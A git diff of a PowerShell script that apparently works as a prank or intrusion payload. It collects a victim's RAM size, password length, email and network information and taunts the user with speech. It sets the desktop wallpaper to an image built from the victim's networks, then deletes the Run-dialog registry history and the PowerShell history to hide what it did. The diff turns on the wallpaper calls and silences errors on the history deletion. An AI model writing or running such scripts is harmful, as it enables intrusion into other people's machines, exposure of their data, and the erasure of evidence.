@@ -182,13 +182,13 @@ public class Params
 }
 "@ 
   
-    # $SPI_SETDESKWALLPAPER = 0x0014
-    # $UpdateIniFile = 0x01
-    # $SendChangeEvent = 0x02
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $UpdateIniFile = 0x01
+    $SendChangeEvent = 0x02
   
-    # $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
   
-    # $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
 function Get-email {
@@ -296,14 +296,13 @@ else {
     $s.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
 }
 
-$s.sleep(1000)
 
 # if pass is bigger or less then 
 if ($pass -gt 6) {
-    $message = "A password thats $passLength chartors long. Well done. Your not as dumb as you seem, still pretty dumb."
+    $message = "A password thats $passLength characters long. Well done. Your not as dumb as you seem, still pretty dumb."
 }
 else {
-    $message = "A password thats $passLength chartors long is not secure at all mate. Pretty dumb."
+    $message = "A password thats $passLength characters long is not secure at all mate. Pretty dumb."
 }
 
 if ($days -gt 30) {
@@ -327,7 +326,7 @@ $s.Speak("Want to see something cool?")
 
 $Image = Gen-Image -Networks $Networks
 Set-WallPaper -Image $Image -Style "Fit"
-$s.Sleep(2000)
+
 
 $s.Speak("Have a look at your desktop, il be waiting here...")
 
@@ -336,7 +335,7 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Delete powershell history
 
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 Remove-Item "C:\Users\Public\Documents\test.png"
 
